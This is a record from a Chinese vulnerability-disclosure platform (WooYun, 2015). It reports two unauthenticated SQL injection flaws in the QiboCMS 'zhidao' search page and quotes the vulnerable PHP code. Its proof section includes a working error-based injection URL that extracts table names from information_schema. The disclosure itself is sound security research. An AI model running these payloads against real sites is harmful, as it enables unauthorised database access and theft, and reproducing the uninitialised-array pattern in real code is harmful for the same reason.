{"id": 31000, "wybug_id": "wooyun-2015-0115138", "wybug_title": "qibocms知道系统SQL注入2枚", "wybug_corp": "齐博CMS", "wybug_author": "路人甲", "wybug_date": "2015-05-20 14:44", "wybug_open_date": "2015-05-25 14:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：   详细说明：  第一枚：zhidao/search.php\n$sort_where=\"where `qa_quantity`>0\";        foreach($forSearchKey as $key){                $sort_where_a[]=\"BINARY `name` like('%$key%')\";        }        if(count($sort_where_a)>0){                $sort_where.=\" AND (\".implode(\" or \",$sort_where_a).\")\";                $query=$db->query(\"SELECT `fid`,`name`,`qa_quantity` FROM `{$_pre}sort` $sort_where \");                while($rs=$db->fetch_array($query)){                        $sort_list[]=$rs;                }               }\n语句中把先是赋值给数组sort_where_a，然后在分割为字符串赋给变量where这本来是没有问题的，但是数组sort_where_a未初始化，结合齐博的伪全局机制就造成了sql注入（无限制 无需登录）第二枚：zhidao/search.php\nif(count($forSearchKey)>2){                        for($i=0;$i<ceil(count($forSearchKey)/2);$i++){                                for($j=0;$j<count($forSearchKey);$j++){                                        if($i!=$j){                                                $fulltext[]=\" (BINARY `title` like('%\".$forSearchKey[$i].\"%') AND BINARY `title` like('%\".$forSearchKey[$j].\"%'))\";                                        }                                }                        }                                                $where.=\" AND (\".implode(\" or \",$fulltext).\")\";                                        }\n进入该语句需要count($forSearchKey)>2  但是forSearchKey我们是可以控制的在第一个语句中把先是赋值给数组fullext，然后在分割为字符串赋给变量where（）这本来是没有问题的，但是数组fullext未初始化，结合齐博的伪全局机制就造成了sql注入（无限制 无需登录）而在同一页面中带进了查询语句\n$min=($page-1)*$rows;                        $query = $db->query(\"SELECT `aid`,`sortid`,`sid`,`info_cate`,`title`,`addtime`,`uid`,`username`,`content`,`money`,`isover`,`imgs` FROM {$_pre}content $where ORDER BY `addtime` DESC LIMIT $min,$rows\");\n   漏洞证明：    http://localhost/zhidao/zhidao/search.php?&tags=ll%20ll%20ll&keyword=111&fulltext[]=11)\n\nhttp://localhost/zhidao/zhidao/search.php?&tags=ll%20ll%20ll&keyword=111&fulltext[]=11)%20and%201=2%20union%20select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1))a%20from%20information_schema.tables%20group%20by%20a)b%23\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-05-25 14:46 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-31 14:33 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  洞主  你选错类型 没选通用..    \n     2015-06-15 21:51 |    \t\t小菜虫 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:5        )\t\t \n  @玉林嘎 选不选通用都没区别 反正没有奖金    \n     2015-06-15 21:55 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  @小菜虫 怎么会没奖金呢    \n     2015-06-15 22:03 |    \t\t小菜虫 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:5        )\t\t \n  @玉林嘎 不知道啊  我一直以为现在都没有了。。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}